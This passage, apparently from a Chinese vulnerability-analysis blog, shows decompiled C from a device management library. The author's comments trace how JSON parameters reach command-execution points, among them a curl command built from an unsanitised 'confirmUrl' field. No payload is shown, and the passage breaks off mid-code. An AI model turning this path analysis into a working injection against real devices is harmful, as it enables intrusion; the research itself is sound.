class="number">20</span>);</span><br><span class="line">  LOBYTE(_20_23_is_data[<span class="number">1</span>]) = *(_BYTE *)(addr + <span class="number">41</span>);</span><br><span class="line">  addr_40 = *(_BYTE *)(addr + <span class="number">40</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">2</span>] = addr_20;</span><br><span class="line">  addr_32 = *(_DWORD *)(addr + <span class="number">32</span>);</span><br><span class="line">  BYTE1(_20_23_is_data[<span class="number">1</span>]) = addr_40;</span><br><span class="line">  addr_43 = *(_BYTE *)(addr + <span class="number">43</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">18</span>] = addr_32;</span><br><span class="line">  addr_24 = *(_DWORD *)(addr + <span class="number">24</span>);</span><br><span class="line">  BYTE1(_20_23_is_data[<span class="number">4</span>]) = addr_43;</span><br><span class="line">  addr_44 = *(_BYTE *)(addr + <span class="number">44</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">3</span>] = addr_24;</span><br><span class="line">  addr_0 = *(_DWORD *)addr;</span><br><span class="line">  BYTE2(_20_23_is_data[<span class="number">4</span>]) = addr_44;</span><br><span class="line">  _20_23_is_data[<span class="number">7</span>] = addr_0;                   <span class="comment">// 7这个位置=addr[0]的值</span></span><br><span class="line">  <span class="keyword">if</span> ( g_info &amp;&amp; !addr_0 )</span><br><span class="line">    _20_23_is_data[<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line">  data_2 = (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">20</span>];</span><br><span class="line">  LOBYTE(_20_23_is_data[<span class="number">8</span>]) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">20</span>] )                    <span class="comment">// 不会进去</span></span><br><span class="line">  &#123;</span><br><span class="line">    v52 = _20_23_is_data[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;set&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;add&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;del&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;update&quot;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_93;</span><br><span class="line">    v53 = (<span class="type">int</span> *)addr;</span><br><span class="line">    <span class="keyword">if</span> ( _20_23_is_data[<span class="number">7</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_172:</span><br><span class="line">      v75 = *v53;</span><br><span class="line">LABEL_173:</span><br><span class="line">      <span class="keyword">if</span> ( !v75 &amp;&amp; g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)para networkId:%s, groupId:%s!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">538</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">9</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">10</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;get&quot;</span>)</span><br><span class="line">        &amp;&amp; ((v76 = _20_23_is_data[<span class="number">14</span>], !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">14</span>], <span class="string">&quot;configPath&quot;</span>))</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configVersion&quot;</span>)</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configDefault&quot;</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">15</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_184;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">14</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      _20_23_is_data[<span class="number">24</span>] = find_module_info(v77, &amp;_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">      v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">LABEL_184:</span><br><span class="line">      <span class="keyword">if</span> ( v78 )</span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_BYTE *)(_20_23_is_data[<span class="number">0</span>] + <span class="number">48</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          pthread_mutex_lock(v78 + <span class="number">112</span>);</span><br><span class="line">          v98 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">if</span> ( _sigsetjmp(v96, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_unlock(v98 + <span class="number">112</span>);</span><br><span class="line">            _pthread_unwind_next(v96);</span><br><span class="line">          &#125;</span><br><span class="line">          _pthread_register_cancel(v96);</span><br><span class="line">          v80 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">12</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v80 &amp;&amp; *v80 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">                <span class="number">579</span>,</span><br><span class="line">                uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">                v80,</span><br><span class="line">                _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(</span><br><span class="line">              uf_log,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">              <span class="number">583</span>,</span><br><span class="line">              uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">              _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);<span class="comment">// 命令执行点</span></span><br><span class="line">          pthread_mutex_unlock(_20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          _pthread_unregister_cancel(v96);</span><br><span class="line">LABEL_211:</span><br><span class="line">          v82 = addr;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_212;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">      &#125;</span><br><span class="line">      v81 = *(<span class="type">const</span> <span class="type">char</span> **)(v79 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v81 &amp;&amp; *v81 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          uf_log_printf(</span><br><span class="line">            uf_log,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">            <span class="number">593</span>,</span><br><span class="line">            uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">            (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">            (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">            v81,</span><br><span class="line">            v78 + <span class="number">112</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">597</span>,</span><br><span class="line">          uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">          v78 + <span class="number">112</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);    <span class="comment">// 命令执行点</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_211;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>]) )</span><br><span class="line">      v54 = (<span class="type">char</span> *)dword_4364AC;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v54 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    _20_23_is_data[<span class="number">10</span>] = (<span class="type">int</span>)v54;</span><br><span class="line">    _20_23_is_data[<span class="number">9</span>] = dword_4364A8;</span><br><span class="line">LABEL_171:</span><br><span class="line">    v53 = (<span class="type">int</span> *)addr;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_172;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(_20_23_is_data[<span class="number">20</span>], <span class="string">&#x27;&#125;&#x27;</span>) || <span class="built_in">strchr</span>(data_2, <span class="string">&#x27;]&#x27;</span>) )<span class="comment">// 如果data段中有]或&#125;,显然进去</span></span><br><span class="line">  &#123;</span><br><span class="line">    _20_23_is_data[<span class="number">23</span>] = json_tokener_parse(data_2, v49);</span><br><span class="line">    <span class="keyword">if</span> ( _20_23_is_data[<span class="number">23</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)start param parse:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>, <span class="number">142</span>, data_2);</span><br><span class="line">      data_4 = json_object_get_object(_20_23_is_data[<span class="number">23</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( data_4 )</span><br><span class="line">        v56 = *(<span class="type">int</span> **)(data_4 + <span class="number">32</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v56 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v56 )</span><br><span class="line">      &#123;</span><br><span class="line">        v57 = *v56;</span><br><span class="line">        v58 = *v56;</span><br><span class="line">        v59 = v56[<span class="number">1</span>];</span><br><span class="line">        v56 = (<span class="type">int</span> *)v56[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v58, <span class="string">&quot;module&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          _20_23_is_data[<span class="number">15</span>] = json_object_get_string(v59);</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)para-module:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v57, <span class="string">&quot;device&quot;</span>) || *(_DWORD *)(addr + <span class="number">16</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;groupId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">10</span>] = json_object_get_string(v59);</span><br><span class="line">            LOBYTE(_20_23_is_data[<span class="number">8</span>]) = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;networkId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">9</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;sn&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( json_object_get_type(v59) == <span class="number">5</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              _20_23_is_data[<span class="number">19</span>] = json_object_array_length(v59);</span><br><span class="line">              <span class="keyword">if</span> ( _20_23_is_data[<span class="number">19</span>] &gt; <span class="number">0</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                idx = json_object_array_get_idx(v59, <span class="number">0</span>);</span><br><span class="line">                _20_23_is_data[<span class="number">18</span>] = json_object_get_string(idx);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;configId&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">11</span>] = json_object_get_string(v59);</span><br><span class="line">            <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)param configId:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;configTime&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">12</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;currentTime&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">13</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;buffer&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">16</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;file&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            _20_23_is_data[<span class="number">17</span>] = json_object_get_string(v59);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v57, <span class="string">&quot;existIndepend&quot;</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v62 = json_object_get_string(v59);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v62, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">              BYTE2(_20_23_is_data[<span class="number">1</span>]) = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v60 = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(v59);</span><br><span class="line">          <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)device:%s&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;parse_param&quot;</span>, <span class="number">149</span>, v60);</span><br><span class="line">          <span class="keyword">if</span> ( v60 )</span><br><span class="line">            *(_DWORD *)(addr + <span class="number">16</span>) = strdup(v60);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">7</span>] )                 <span class="comment">// 这里不进去</span></span><br><span class="line">      &#123;</span><br><span class="line">        v63 = _20_23_is_data[<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">10</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>])</span><br><span class="line">            || _20_23_is_data[<span class="number">15</span>] &amp;&amp; sub_4078B4((<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">15</span>]) )</span><br><span class="line">          &#123;</span><br><span class="line">            v64 = (<span class="type">char</span> *)dword_4364AC;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v64 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          _20_23_is_data[<span class="number">10</span>] = (<span class="type">int</span>)v64;</span><br><span class="line">          v63 = _20_23_is_data[<span class="number">9</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        v65 = _20_23_is_data[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !v63 )</span><br><span class="line">        &#123;</span><br><span class="line">          _20_23_is_data[<span class="number">9</span>] = dword_4364A8;</span><br><span class="line">          v65 = _20_23_is_data[<span class="number">10</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v65 )</span><br><span class="line">        &#123;</span><br><span class="line">          v66 = <span class="built_in">strlen</span>(v65);</span><br><span class="line">          <span class="keyword">if</span> ( v66 &gt;= <span class="number">0x12</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v50 = <span class="string">&quot;ERROR (%s %s %d)groupId oversize %d&quot;</span>;</span><br><span class="line">LABEL_142:</span><br><span class="line">            v51 = <span class="string">&quot;detect_gid_nid_invalid&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_143;</span><br><span class="line">          &#125;</span><br><span class="line">          v67 = (<span class="type">char</span> *)v65;</span><br><span class="line">          v68 = (<span class="type">char</span> *)(v65 + v66);</span><br><span class="line">          <span class="keyword">while</span> ( v67 != v68 )</span><br><span class="line">          &#123;</span><br><span class="line">            v69 = *v67++;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v69 - <span class="number">48</span>) &gt;= <span class="number">0xA</span>u )</span><br><span class="line">            &#123;</span><br><span class="line">              v50 = <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, pure number need!&quot;</span>;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_142;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v70 = <span class="built_in">strlen</span>(_20_23_is_data[<span class="number">9</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( v70 &gt;= <span class="number">0x22</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v50 = <span class="string">&quot;ERROR (%s %s %d)networkId oversize %d&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v71 = (<span class="type">unsigned</span> __int8 *)_20_23_is_data[<span class="number">9</span>];</span><br><span class="line">          v72 = (<span class="type">char</span> *)(_20_23_is_data[<span class="number">9</span>] + v70);</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( v71 == (<span class="type">unsigned</span> __int8 *)v72 )</span><br><span class="line">              &#123;</span><br><span class="line">                v75 = *(_DWORD *)addr;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_173;</span><br><span class="line">              &#125;</span><br><span class="line">              v73 = (<span class="type">char</span>)*v71;</span><br><span class="line">              v74 = *v71;</span><br><span class="line">              <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v74 - <span class="number">48</span>) &gt;= <span class="number">0xB</span> &amp;&amp; (v74 &amp; <span class="number">0xFFFFFFDF</span>) - <span class="number">65</span> &gt;= <span class="number">0x1A</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              ++v71;</span><br><span class="line">            &#125;</span><br><span class="line">            ++v71;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v73 == <span class="number">95</span> );</span><br><span class="line">          v50 = <span class="string">&quot;ERROR (%s %s %d)invalid char: %c, need [number][:][A~Z][_][a~z]!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_142;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_171;                           <span class="comment">// 执行这个</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_93:</span><br><span class="line">  v50 = <span class="string">&quot;ERROR (%s %s %d)param parse failed![%s]&quot;</span>;</span><br><span class="line">  v51 = <span class="string">&quot;parse_param&quot;</span>;</span><br><span class="line">LABEL_143:</span><br><span class="line">  v95 = <span class="number">0</span>;</span><br><span class="line">  uf_log_printf(uf_log, v50, <span class="string">&quot;ufm_lib.c&quot;</span>, v51);</span><br><span class="line">  _20_23_is_data[<span class="number">22</span>] = strdup(<span class="string">&quot;&#123;\&quot;rcode\&quot;:\&quot;03510003\&quot;,\&quot;rmsg\&quot;:\&quot;UF: param is invalid\&quot;&#125;&quot;</span>);</span><br><span class="line">LABEL_244:</span><br><span class="line">  v82 = addr;</span><br><span class="line">LABEL_212:</span><br><span class="line">  v83 = LOBYTE(_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_BYTE *)(v82 + <span class="number">45</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_237;</span><br><span class="line">  <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">20</span>] )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_236;</span><br><span class="line">  data_3 = json_tokener_parse(*(_DWORD *)(v82 + <span class="number">12</span>), v40);</span><br><span class="line">  v85 = data_3;</span><br><span class="line">  <span class="keyword">if</span> ( !data_3 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)-u param is invalid!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>, <span class="number">400</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_235;</span><br><span class="line">  &#125;</span><br><span class="line">  data_confirmUrl = json_object_object_get(data_3, <span class="string">&quot;confirmUrl&quot;</span>);</span><br><span class="line">  data_confirmUrl_1 = data_confirmUrl;</span><br><span class="line">  <span class="keyword">if</span> ( !data_confirmUrl || json_object_get_type(data_confirmUrl) != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)url is empty!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_234;</span><br><span class="line">  &#125;</span><br><span class="line">  v89 = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(data_confirmUrl_1);</span><br><span class="line">  v88 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  v90 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(v88 + <span class="number">128</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v90 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)malloc failed!&quot;</span>, <span class="string">&quot;ufm_lib.c&quot;</span>, <span class="string">&quot;url_reply&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_234;</span><br><span class="line">  &#125;</span><br><span class="line">  v91 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v90[v91], <span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">  v92 = <span class="built_in">strlen</span>(v89);</span><br><span class="line">  <span class="built_in">snprintf</span>(</span><br><span class="line">    v90,</span><br><span class="line">    v92 + <span class="number">127</span>,</span><br><span class="line">    <span class="string">&quot;curl -m 5 -s -k -X POST \&quot;%s\&quot; -H &#x27;content-type: application/json&#x27; -d &#x27;&#123;\&quot;code\&quot;:\&quot;0\&quot;,\&quot;msg\&quot;:\&quot;success\&quot;&#125;&#x27;&quot;</span>,</span><br><span class="line">    v89);</span><br><span class="line">  v96[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v93 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ufm_popen(v90, v96);                        <span class="comment">// 命令执行点</span></span><br><span class="line">........</span><br><span class="line">  &#125;</span><br><span class="line">.........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跳到这里之后就跳过第一个if进入第二个if，然后执行goto LABEL_171;   和goto LABEL_172;  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">LABEL_172:</span><br><span class="line">      v75 = *v53;</span><br><span class="line">LABEL_173:</span><br><span class="line">      <span class="keyword">if</span> ( !v75 &amp;&amp; g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)para networkId:%s, groupId:%s!&quot;</span>,</span><br><span class="line">          <span 